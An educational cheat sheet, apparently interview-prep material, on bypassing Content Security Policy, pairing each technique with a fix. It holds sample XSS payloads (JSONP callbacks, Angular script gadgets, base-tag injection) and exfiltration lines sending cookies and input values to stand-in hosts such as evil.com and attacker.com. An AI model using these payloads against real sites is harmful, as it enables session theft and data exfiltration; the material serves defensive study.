CSP Bypass Techniques

// ═══ 1. unsafe-inline bypass ═══
// If policy has 'unsafe-inline': XSS works directly
script-src 'self' 'unsafe-inline'
// Attacker injects: <script>steal()</script> → runs!
// Fix: Remove 'unsafe-inline', use nonces

// ═══ 2. Overly broad allowlist ═══
script-src *.googleapis.com
// googleapis.com hosts JSONP endpoints!
// Attacker: <script src="https://accounts.googleapis.com/o/
//   oauth2/revoke?callback=alert(1)">
// The JSONP endpoint executes attacker's callback

// ═══ 3. CDN bypass ═══
script-src https://cdnjs.cloudflare.com
// Attacker loads Angular from cdnjs, then uses ng-app
// to execute arbitrary expressions via template injection

// ═══ 4. unsafe-eval bypass ═══
script-src 'self' 'unsafe-eval'
// Attacker can use: eval(), new Function(), setTimeout("code")
// Even DOM-based XSS sinks work

// ═══ 5. Missing directives ═══
script-src 'self'
// Missing object-src → attacker loads Flash/Java plugin
// Missing base-uri → attacker injects <base href>

JSONP & Base Tag Attacks

// ═══ JSONP Bypass ═══
// Many Google/Facebook APIs support JSONP
// JSONP wraps response in a function call:
// GET /api?callback=myFunc → myFunc({"data":"..."})

// If CSP allows the JSONP host:
script-src 'self' https://api.google.com
// Attacker injects:
<script src="https://api.google.com/endpoint?callback=alert"></script>
// Server returns: alert({...}) → XSS!

// Fix: Use strict-dynamic + nonces (ignores URL allowlists)

// ═══ Base Tag Injection ═══
// If base-uri is not restricted:
// Attacker injects: <base href="https://evil.com/">
// All relative script paths now load from evil.com!
// <script src="/app.js"> → loads evil.com/app.js

// Fix:
Content-Security-Policy: base-uri 'self'

// ═══ Script Gadgets (Framework-based) ═══
// Angular: {{constructor.constructor('alert(1)')()}}
// Knockout: data-bind="value: alert(1)"
// Mavo: mv-expressions="alert(1)"
// If the framework JS is CSP-allowed, gadgets bypass CSP

Data Exfiltration Despite CSP

// Even strict CSP may not prevent data exfiltration

// 1. DNS prefetch (if connect-src blocks fetch)
<link rel="dns-prefetch"
  href="//stolen-data.attacker.com">
// Browser makes DNS query → attacker's DNS server logs it

// 2. CSS-based exfiltration
// If style-src allows attacker's origin:
input[value^="a"] { background: url("//evil.com/?char=a") }
input[value^="b"] { background: url("//evil.com/?char=b") }
// Extracts input values character by character

// 3. WebRTC leak
// WebRTC can make connections not governed by connect-src

// 4. Navigation-based
// window.location = "//evil.com/?" + document.cookie
// Fix: navigate-to directive (experimental)

// Comprehensive defense:
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{random}' 'strict-dynamic';
  connect-src 'self';
  style-src 'self';
  img-src 'self';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  object-src 'none'

Google Senior Frontend — CSP Bypasses

Q: Your CSP uses script-src 'self' https://cdn.jsdelivr.net. Is this secure?

No. CDN allowlisting is a well-known CSP bypass. Attack: (1) jsdelivr hosts millions of packages. Attacker finds one that executes arbitrary code (or uploads their own npm package). (2) Attacker injects: <script src="https://cdn.jsdelivr.net/npm/evil-package"></script> — CSP allows it because the origin matches. (3) Same with cdnjs, unpkg, googleapis. Google's research: 95% of CSP policies with URL allowlists are bypassable. Fix: Replace URL allowlists with nonce-based CSP + strict-dynamic. script-src 'nonce-{random}' 'strict-dynamic'; — This ignores URL allowlists entirely. Only scripts with the correct nonce run. Scripts they dynamically load are also trusted. For CDN scripts: add nonce attribute to the script tag. The CDN origin doesn't need to be in the policy.
